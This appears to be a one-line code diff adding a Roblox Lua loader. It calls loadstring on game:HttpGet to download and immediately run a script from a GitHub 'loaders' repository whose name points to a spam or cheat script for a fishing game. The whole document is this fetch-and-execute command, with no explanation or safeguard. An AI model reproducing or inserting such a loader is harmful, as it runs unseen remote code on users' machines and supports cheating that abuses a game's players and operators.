@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vortexorbimagine/loaders/main/loaders/harpoon-a-fish-spam1-ygww40mlguiu19.lua"))()
